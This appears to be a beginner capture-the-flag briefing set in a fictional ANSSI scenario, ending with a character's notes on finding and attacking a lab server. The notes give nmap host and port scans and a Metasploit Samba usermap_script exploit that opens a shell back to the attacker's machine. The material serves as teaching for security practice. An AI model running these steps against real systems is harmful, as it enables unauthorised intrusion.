# Mission Order

During your second-year internship, you had the chance to join the ANSSI (National Agency for Information Systems Security) for a few months. One of the agents on your team has stolen a server containing information that you absolutely need to recover. The ANSSI management trusts you and gives you carte blanche to retrieve this information.

Your mission is to retrieve the information contained in the `flag.txt` file located on the server. This server has been connected somewhere on the ANSSI network. ANSSI provides you with a Kali Linux machine to attack the server. Find the server, attack it, and retrieve the file.

The security of France depends on it. Good luck, agent.

PS: The agent who stole the server left you his notes to help you hack the server.

# Agent White's Notes

Agent White left his personal notes on how to hack a server. Here is what he wrote:

## Network Scan

First, I need to know the network I am on. For this, I can use the `ifconfig` command to know my IP address and subnet mask.

```bash
ifconfig
```

Ok, I know my IP address and subnet mask. Now I need to scan the network to find the server. I can scan the network with a tool called `nmap`. This tool allows you to scan the open ports on a machine (ports are connection points to a machine). To scan the network, I can use the following command:

```bash
nmap -sn <IP>/<mask>
```

## Port Scan

Now that I know the machines connected to the network, I need to scan the open ports on these machines to find a vulnerability. For this, I can use the following command:

```bash
nmap -p- -A <IP>
```

If there are open ports, I can try to hack the server; otherwise, I need to look for another machine.

If I find a machine with open ports, I can try to hack the server. For this, I can use tools like `metasploit`. This tool allows you to find vulnerabilities in the services running on the server and exploit them to take control of the server.

## Exploitation

A colleague recently told me about a vulnerability in the Samba service `microsoft-ds` (file servers for Microsoft). Here's how he exploited it:

```bash
# Open metasploit
msfconsole
# Search for the module to exploit the vulnerability
msf6 > search samba
# Load the module
msf6 > use exploit/multi/samba/usermap_script
# Configure the module
msf6 > show options
msf6 > set RHOSTS <SERVER_IP>
msf6 > set LHOST <KALI_IP>
# Execute the module
msf6 > exploit
```

From there, he should be on the machine, but I don't remember the next steps.

## Handy Linux Commands

Some Linux commands I use often:

```bash
# List files and directories in the current directory
ls
# Change directory
cd <directory_name>
# Read the contents of a file
cat <file_name>
# Display the path of the current directory
pwd
```
